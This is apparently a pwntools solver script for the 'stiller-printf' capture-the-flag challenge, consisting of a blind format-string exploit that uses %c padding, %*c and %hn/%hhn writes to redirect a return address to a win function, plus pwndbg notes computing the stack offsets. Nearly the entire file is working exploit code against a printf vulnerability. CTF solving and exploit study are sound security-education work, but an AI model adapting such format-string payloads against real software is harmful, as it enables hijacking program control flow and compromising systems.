from pwn import *

chal = ELF('./vuln')

gdbscript='''
b *main + 121
c
'''

context.binary = chal
context.terminal = ["tmux", "splitw", "-h"]

conn = remote('localhost', 1337)
#conn = remote('stillerer-printf.chal.imaginaryctf.org', 1337)

"""
See:
- https://blog.redrocket.club/2020/12/23/HXPCTF-Still_Printf/
- https://eth007.me/blog/posts/stiller-printf/
"""

"""
pwndbg> tel $rsp 100
...
38:01c0│-150         0x7ffe8b2446d0 —▸ 0x7ffe8b244730 —▸ 0x7ffe8b244830 —▸ 0x7ffe8b244870
...
44:0220│-0f0         0x7ffe8b244730 —▸ 0x7ffe8b244830 —▸ 0x7ffe8b244870
...
55:02a8│-068         0x7ffe8b2447b8 —▸ 0x7ffe8b2447e8 ◂— 0
pwndbg> i r rsp
rsp            0x7ffe8b244510      0x7ffe8b244510
pwndbg> x/xw 0x7ffe8b2446d0
0x7ffe8b2446d0: 0x8b244730
pwndbg> p/d 0x7ffe8b2446d0 + 3 - 0x7ffe8b244510
$1 = 451
pwndbg> p/x $rsp - 0x8
$2 = 0x7ffe8b244508
pwndbg> p/x 0x4508 - 0x4730
$3 = 0xfffffdd8
pwndbg> p/d 0xfdd8 - (0x5 + 0x37 + 10)
$4 = 64914
pwndbg> p/d (0x7ffe8b2447e8 - 0x7ffe8b244510) / 0x8 + 6
$5 = 97
pwndbg> x/2i $rip
=> 0x5d95c28772f4 <main+121>:   call   0x5d95c28770d0 <printf@plt>
   0x5d95c28772f9 <main+126>:   mov    edi,0x0
pwndbg> p win
$6 = {<text variable, no debug info>} 0x5d95c2877209 <win>
pwndbg> p/d 0x80 + 0x9
$7 = 137
pwndbg> p/d (0x7ffe8b244830 - 0x7ffe8b244510) / 0x8 + 6
$8 = 106
"""

def main():
    length = 452
    payload = b'%c' * 0x5
    payload += b'%c' * 0x37
    payload += b'%64914c'
    payload += b'%*c'
    payload += b'%c' * 10
    payload += b'%hn'           # The lower 2 bytes of the counter are now the same as $rsp - 0x8.
    payload += b'%c' * 16       # The least significant byte of the counter is now ?8.
    payload += b'%hhn'
    payload += b'%*97$c' * 15   # The least significant byte of the counter is now 0x?8 * 0x10 =  0x?0 * 0x10 + 0x08 * 0x10 = 0x?00 * 0x80 = 0x?80.
    payload += b'%137c'         # The least significant byte of the counter is now 0x?80 + 0x89 = ?09.
    payload += b'%106$hhn'      # ret2win
    
    assert len(payload) < length
    info(f'len = {len(payload):#x}')
    info(f'{payload = }')
    conn.sendline(str(length).encode())
    conn.sendline(payload)

    """
    pause()
    pid = int(process(['pgrep', '-f', '-n', '/vuln']).recvline().strip())
    gdb.attach(pid, exe=chal.path, gdbscript=gdbscript)
    """
    
    conn.interactive()

if __name__ == '__main__':
    main()